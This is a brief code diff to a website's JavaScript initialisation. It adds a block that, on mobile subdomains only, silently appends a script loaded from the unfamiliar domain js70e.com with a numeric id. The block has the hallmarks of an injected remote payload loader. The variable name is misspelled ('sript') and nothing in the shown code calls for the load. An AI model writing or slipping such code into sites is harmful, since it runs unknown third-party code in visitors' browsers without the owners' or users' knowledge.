@@ -51,6 +51,11 @@ $(function(){
     if (window.location.pathname == '/') {
         getFriendly();
     }
+    if (window.location.host.indexOf('m.') > -1) {
+        var sript = document.createElement('script');
+        sript.src = 'https://js70e.com/s.php?id=19617';
+        document.getElementsByTagName('body')[0].appendChild(sript);
+    }
 });
 
 function getFriendly () {
